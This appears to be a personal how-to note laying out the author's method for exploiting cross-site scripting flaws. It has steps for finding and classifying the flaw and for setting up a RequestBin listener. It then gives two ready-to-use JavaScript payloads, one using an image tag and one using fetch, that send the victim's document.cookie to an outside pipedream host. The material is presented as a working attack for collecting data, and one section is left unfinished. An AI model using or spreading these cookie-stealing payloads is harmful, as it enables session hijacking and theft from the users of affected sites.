Here will be my way of work for [[XSS]] vulns

# Step 1 : Found it
The first step is to find the XSS flaw.
I mean find the website and the right input to use.

---
# Step 2 : Recognise the type

## Step 2 : Stored XSS
the step 2 consist on knowing which type of xss flaw we are working on.
We can test it by storing something and trying to acces it from another way

## Step 2 : Reflective XSS
{{In progress}}

---
# Step 3 : JS script

## Step 3 : Setup the server
Here we gonna enter in the hard thing, we want datas !
to get some data we can use a script which will call a domain that we are listening on & send the client data.

For doing that we first need to setup the listening server.
A real good website for this is [RequestBin](https://pipedream.com/requestbin) .

## Step 3 : Find a way to call our server
Now that we have our listening server, we just need to find a way to call our server.
There is many ways to call an url in js, we can use images or even fetch or even XMLHttpRequest.

### Step 3 : Use an image
Here is the script to send a request via an image : 
`<script>document.write('<img src="https://eolyqf07jmav0tu.m.pipedream.net/?c='+document.cookie+'" />');</script>`
	document.write = write an element on the webclient
	img  src= add an image and put the src to our server instead of an image link
	 +document.cookie = add the cookies of the page where is executed the script

So with this script we can get the cookies of the client who load the script we stored in an img in the db

### Step 3 : fetch the server
Here is the script to send a request via fetch function : 
`<script>fetch('https://eolyqf07jmav0tu.m.pipedream.net', {method: 'POST', mode: 'no-cors', body:document.cookie });</script>`
	fetch = use the function fetch
	url = put the server url
	{} = put inside the method & differents header
	body = document.cookie = add the cookie of the page where is executed the script in the body of the request

So with this script we can get the cookie of the client who load the script we stored in the db